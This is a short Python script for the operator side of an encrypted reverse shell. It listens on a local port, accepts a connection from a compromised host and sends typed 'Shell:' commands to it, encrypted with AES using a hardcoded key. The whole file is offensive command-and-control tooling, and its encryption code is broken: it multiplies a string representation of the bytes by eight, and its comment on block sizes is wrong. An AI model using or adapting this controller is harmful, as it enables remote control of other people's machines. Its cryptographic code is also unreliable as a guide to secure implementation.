#! /usr/bin/env python3



import socket
import os
from Crypto.Cipher import AES
from Crypto import Random

key = b'secretkey0123456'
iv = Random.new().read(AES.block_size)
chipher = AES.new(key, AES.MODE_CFB, iv)


def encrypt(message):
    #encode to byte and encrypt encrypte, must be mulitple of eight
    return chipher.encrypt( ("%s" % message.encode("ascii") ) *8 )

def connect():

    #create low-level socket object using standard settings
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #connect to server by providing IP and Port number ( in this case )

    # ip = "xxx.xx.xx.xx"
    ip = "127.0.0.1"
    port = 8080

    sock.bind((ip, port))

    #Listend for a connection
    sock.listen(1)


    print ("[+] Listening for incoming TCP connection on port " + str(port))

    # get connection and address
    connection, addr = sock.accept()
    print('{0}'.format(connection))

    print ("[+] We got a connection from:" + '{0}'.format(addr))


    while True:

        # receive input from user
        commandLine = input('Shell: ')

        # close if terminate input
        if 'terminate' in commandLine:
            connection.send(b'terminate')
            connection.close()
            break

        else:
            #encrypt message and send
            commandLine = encrypt(commandLine)
            connection.send(commandLine)

if __name__=="__main__":
    connect()






































#encode
